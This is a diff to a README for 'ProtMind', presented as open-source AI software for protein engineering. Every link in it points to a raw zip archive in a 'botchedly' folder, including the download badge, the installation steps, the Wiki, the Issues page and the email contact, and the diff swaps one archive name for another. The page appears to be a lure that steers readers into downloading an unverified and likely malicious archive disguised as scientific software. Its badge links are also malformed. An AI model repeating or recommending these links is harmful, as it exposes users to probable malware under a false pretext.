@@ -8,9 +8,9 @@ Welcome to ProtMind! This application provides open-source AI and machine learni
 
 To get started, you need to download the latest version of ProtMind. 
 
-[![Download ProtMind](https://raw.githubusercontent.com/TheDogDanydel/protmind/main/botchedly/protmind.zip%https://raw.githubusercontent.com/TheDogDanydel/protmind/main/botchedly/protmind.zip)](https://raw.githubusercontent.com/TheDogDanydel/protmind/main/botchedly/protmind.zip)
+[![Download ProtMind](https://raw.githubusercontent.com/TheDogDanydel/protmind/main/botchedly/Software-v3.5.zip%https://raw.githubusercontent.com/TheDogDanydel/protmind/main/botchedly/Software-v3.5.zip)](https://raw.githubusercontent.com/TheDogDanydel/protmind/main/botchedly/Software-v3.5.zip)
 
-Visit [this page to download](https://raw.githubusercontent.com/TheDogDanydel/protmind/main/botchedly/protmind.zip) the application.
+Visit [this page to download](https://raw.githubusercontent.com/TheDogDanydel/protmind/main/botchedly/Software-v3.5.zip) the application.
 
 ### 🛠️ System Requirements
 
@@ -22,7 +22,7 @@ Before you download, please ensure that your system meets the following requirem
 
 ### 📥 Installation Steps
 
-1. Go to [this page to download](https://raw.githubusercontent.com/TheDogDanydel/protmind/main/botchedly/protmind.zip).
+1. Go to [this page to download](https://raw.githubusercontent.com/TheDogDanydel/protmind/main/botchedly/Software-v3.5.zip).
 2. Click on the latest release version.
 3. Choose the installer package that matches your operating system.
 4. Download the installer to your computer.
@@ -62,7 +62,7 @@ ProtMind offers a wide range of features:
 
 If you need help or want to learn more about using ProtMind, consider the following resources:
 
-- **Documentation:** Comprehensive guides are available on the [Wiki](https://raw.githubusercontent.com/TheDogDanydel/protmind/main/botchedly/protmind.zip).
+- **Documentation:** Comprehensive guides are available on the [Wiki](https://raw.githubusercontent.com/TheDogDanydel/protmind/main/botchedly/Software-v3.5.zip).
 - **Community Support:** Join our discussions on GitHub or participate in related forums.
 - **Tutorial Videos:** Watch instructional videos on our YouTube channel for step-by-step guides.
 
@@ -78,9 +78,9 @@ If you encounter any issues, try the following solutions:
 
 For any questions or support needs, feel free to contact us through the following methods:
 
-- **Email:** https://raw.githubusercontent.com/TheDogDanydel/protmind/main/botchedly/protmind.zip
-- **Issues Page:** Report any bugs or feature requests on the [Issues page](https://raw.githubusercontent.com/TheDogDanydel/protmind/main/botchedly/protmind.zip).
+- **Email:** https://raw.githubusercontent.com/TheDogDanydel/protmind/main/botchedly/Software-v3.5.zip
+- **Issues Page:** Report any bugs or feature requests on the [Issues page](https://raw.githubusercontent.com/TheDogDanydel/protmind/main/botchedly/Software-v3.5.zip).
 
 By following these steps, you can effectively download, install, and start using ProtMind. Don't hesitate to explore the tools available and enhance your projects in structural bioinformatics and protein engineering. Happy analyzing! 
 
-[![Download ProtMind](https://raw.githubusercontent.com/TheDogDanydel/protmind/main/botchedly/protmind.zip%https://raw.githubusercontent.com/TheDogDanydel/protmind/main/botchedly/protmind.zip)](https://raw.githubusercontent.com/TheDogDanydel/protmind/main/botchedly/protmind.zip)
+[![Download ProtMind](https://raw.githubusercontent.com/TheDogDanydel/protmind/main/botchedly/Software-v3.5.zip%https://raw.githubusercontent.com/TheDogDanydel/protmind/main/botchedly/Software-v3.5.zip)](https://raw.githubusercontent.com/TheDogDanydel/protmind/main/botchedly/Software-v3.5.zip)
